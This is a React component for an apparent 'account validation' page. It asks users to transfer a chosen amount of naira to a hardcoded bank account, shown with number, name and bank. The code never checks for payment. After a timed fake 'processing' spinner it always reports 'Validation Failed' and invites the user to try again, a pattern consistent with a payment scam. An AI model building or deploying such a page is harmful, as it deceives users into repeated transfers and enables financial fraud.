import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { ArrowLeft, Copy, CheckCircle, XCircle } from 'lucide-react';

interface AccountValidationPageProps {
  onBack: () => void;
  userEmail: string;
  userName: string;
}

const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, userEmail, userName }) => {
  const [currentStep, setCurrentStep] = useState<'form' | 'loading' | 'payment' | 'processing' | 'failed'>('form');
  const [formData, setFormData] = useState({
    fullName: userName,
    email: userEmail,
    phoneNumber: '',
    amount: ''
  });

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const handleSubmit = () => {
    setCurrentStep('loading');

    setTimeout(() => {
      setCurrentStep('payment');
    }, 2000);
  };

  const handlePaymentConfirm = () => {
    setCurrentStep('processing');

    setTimeout(() => {
      setCurrentStep('failed');
    }, 3000);
  };

  // Form step
  if (currentStep === 'form') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 px-4 py-4 flex items-center gap-3">
          <button onClick={onBack} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Account Validation</h1>
        </div>

        <div className="p-4">
          <Card>
            <CardHeader>
              <CardTitle className="text-center text-gray-900">Validate Your Account</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
                <Input
                  type="text"
                  value={formData.fullName}
                  onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                  className="h-12 rounded-xl"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
                <Input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="h-12 rounded-xl"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
                <Input
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={(e) => setFormData({ ...formData, phoneNumber: e.target.value })}
                  placeholder="Enter your phone number"
                  className="h-12 rounded-xl"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Amount (₦)</label>
                <Input
                  type="number"
                  value={formData.amount}
                  onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                  placeholder="Enter amount"
                  className="h-12 rounded-xl"
                />
              </div>

              <Button
                onClick={handleSubmit}
                className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl"
              >
                Continue to Payment
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // Loading step
  if (currentStep === 'loading') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-4 border-blue-600 border-t-transparent mx-auto mb-4"></div>
          <p className="text-gray-600">Loading account details...</p>
        </div>
      </div>
    );
  }

  // Payment step with updated account details
  if (currentStep === 'payment') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 px-4 py-4 flex items-center gap-3">
          <button onClick={onBack} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Payment Details</h1>
        </div>

        <div className="p-4 space-y-4">
          <Card className="bg-blue-600 text-white">
            <CardContent className="p-4">
              <h3 className="text-lg font-bold mb-4">Account Details</h3>
              
              <div className="space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Account Number:</span>
                  <div className="flex items-center gap-2">
                    <span className="font-mono">5268583383</span>
                    <button onClick={() => copyToClipboard('5268583383')} className="text-blue-200 hover:text-white">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Account Name:</span>
                  <div className="flex items-center gap-2">
                    <span className="font-medium">CORALPAY-NextGen PG</span>
                    <button onClick={() => copyToClipboard('CORALPAY-NextGen PG')} className="text-blue-200 hover:text-white">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Bank:</span>
                  <div className="flex items-center gap-2">
                    <span className="font-medium">Sterling Bank</span>
                    <button onClick={() => copyToClipboard('Sterling Bank')} className="text-blue-200 hover:text-white">
                      <Copy size={16} />
                    </button>
                  </div>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-blue-100">Amount:</span>
                  <span className="font-bold text-lg">₦{formData.amount}</span>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
            <p className="text-yellow-800 text-sm">
              <strong>Important:</strong> Transfer the exact amount to the account above, then click "I have sent the money" below.
            </p>
          </div>

          <Button
            onClick={handlePaymentConfirm}
            className="w-full h-12 bg-green-600 hover:bg-green-700 text-white rounded-xl"
          >
            I have sent the money
          </Button>
        </div>
      </div>
    );
  }

  // Processing step
  if (currentStep === 'processing') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-4 border-blue-600 border-t-transparent mx-auto mb-4"></div>
          <p className="text-gray-600">Account validation in progress...</p>
        </div>
      </div>
    );
  }

  // Failed step
  if (currentStep === 'failed') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-red-600 px-4 py-4 flex items-center gap-3">
          <button onClick={onBack} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Validation Failed</h1>
        </div>

        <div className="p-4 flex items-center justify-center min-h-[70vh]">
          <div className="bg-white p-8 rounded-2xl shadow-lg text-center max-w-sm w-full">
            <div className="mb-6">
              <XCircle className="h-16 w-16 text-red-500 mx-auto mb-4" />
              <h2 className="text-xl font-bold text-gray-900 mb-2">Validation Failed</h2>
              <p className="text-gray-600 text-sm">
                Your account validation could not be completed. Please try again or contact support.
              </p>
            </div>

            <div className="space-y-3">
              <Button
                onClick={() => setCurrentStep('form')}
                className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl"
              >
                Try Again
              </Button>
              
              <Button
                onClick={onBack}
                variant="outline"
                className="w-full h-12 rounded-xl"
              >
                Go Back
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return null;
};

export default AccountValidationPage;
